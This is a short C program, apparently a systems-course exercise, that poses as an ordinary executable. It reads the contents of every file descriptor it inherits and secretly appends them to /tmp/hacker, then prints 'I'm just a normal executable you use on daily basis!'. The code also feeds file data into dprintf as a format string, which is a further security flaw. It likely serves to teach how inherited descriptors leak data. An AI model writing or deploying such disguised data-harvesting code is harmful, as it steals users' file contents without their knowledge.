#include "csapp.h"

int main(void) 
{
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);
  int buffers_size=256;
  
  char path[buffers_size];
  char link[buffers_size];
  for(int i=0;i<max_fd;i++)
  {
    if(lseek(i,0,0)>-1)
    {
      snprintf(link,buffers_size,"/proc/self/fd/%d",i);
      int path_size=Readlink(link,path,buffers_size);
      if(path_size>-1)
      {
        path[path_size]='\0';
        dprintf(out,"File descriptor %d is '%s' file!\n",i,path);
        int readd=0;
        char data[buffers_size];
        while((readd=read(i,data,buffers_size))>0)dprintf(out,data,buffers_size);
      }
    }
  }
  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}
